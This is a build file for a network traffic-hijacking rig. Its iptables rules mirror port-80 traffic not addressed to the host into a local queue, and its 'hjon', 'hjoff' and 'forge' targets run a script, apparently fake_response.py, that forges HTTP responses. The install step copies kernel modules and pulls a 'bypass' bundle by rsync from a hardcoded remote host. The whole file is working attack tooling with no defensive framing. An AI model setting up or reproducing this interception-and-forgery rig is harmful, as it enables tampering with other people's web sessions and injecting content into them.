ip=118.192.93.48
#rule1=PREROUTING ! -d $(ip) ! -i lo -p tcp -m tcp --dport 80 -m length --length 41:65535 -j TEE --gateway 127.0.0.1
#rule2=INPUT -i lo -p tcp --dport 80 -j NFQUEUE --queue-num 1
rule0=PREROUTING -d $(ip) -j ACCEPT
rule1=PREROUTING ! -d $(ip) ! -i lo -p tcp -m tcp --dport 80 -m length --length 80:65534 -j TEE --gateway 127.0.0.1
rule2=INPUT -i lo -p tcp --dport 80 -j NFQUEUE --queue-num 1


all:
	@echo 'options: install / hjon / hjoff / hjstatus / forge'
install:
	#yum install libnfnetlink-devel libnetfilter_queue-devel && pip install scapy scapy-http NetfilterQueue
	#cp -i *.h /usr/include/libnfnetlink
	#vi /etc/modprobe.d/clearos.conf
	#rsync -avz --delete --no-o --no-g r400@52.8.100.62:/home/r400/bypass ./
	cp -f bypass/xtables/* /lib/modules/2.6.32-504.8.1.v6.i686/extra/
	cp -f bypass/NetfilterQueue-0.3/build/lib.linux-i686-2.7/netfilterqueue.so /usr/local/lib/python2.7/site-packages/
	cp -f bypass/xtables/libxt_TEE.so /lib/xtables/
	depmod
hjstatus:
	iptables -L -vn -t mangle
hjon:
	iptables -t mangle -A $(rule0)
	iptables -t mangle -A $(rule1)
	iptables -t mangle -A $(rule2)
hjoff:
	@#iptables -t mangle -D $(rule0)
	iptables -F -t mangle
forge:fake_response.py
	python $^
so: fake_response.py
	python setup.py build_ext --inplace
